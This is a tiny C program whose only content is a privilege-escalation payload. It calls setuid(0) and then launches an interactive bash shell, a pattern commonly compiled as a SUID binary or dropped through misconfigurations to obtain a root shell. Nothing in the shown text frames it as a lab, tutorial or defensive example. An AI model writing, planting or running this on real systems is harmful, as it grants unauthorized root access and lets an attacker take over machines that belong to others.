int main(int argc, char **argv) {
	setuid(0);
	system("/bin/bash -i");
	return 0;
}